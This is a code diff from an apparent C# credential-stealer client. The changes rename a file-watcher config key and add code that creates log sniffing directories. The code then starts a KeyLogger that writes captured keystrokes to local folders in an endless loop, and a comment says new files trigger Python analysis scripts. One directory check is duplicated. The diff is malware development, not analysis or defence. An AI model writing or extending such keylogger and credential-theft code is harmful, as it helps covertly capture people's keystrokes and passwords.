@@ -157,7 +157,7 @@ namespace CredentialStealer.Client.Console
             {
                 //Listen D1 files and execute python scripts
                 FileSystemWatcher watcher = new FileSystemWatcher();
-                watcher.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffDir"];
+                watcher.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"];
                 watcher.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.DirectoryName;
                 watcher.Filter = "*.*";
                 watcher.Created += new FileSystemEventHandler(OnChangedToAnalyse);
@@ -191,6 +191,25 @@ namespace CredentialStealer.Client.Console
         {
             try
             {
+                
+                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]))
+                {
+                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]);
+                }
+
+                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"]))
+                {
+                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"]);
+                }
+                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]))
+                {
+                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]);
+                }
+
+                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"]))
+                {
+                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"]);
+                }
                 KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\log_src", @"C:\ITC\log_dest");
                 while (true)
                 {
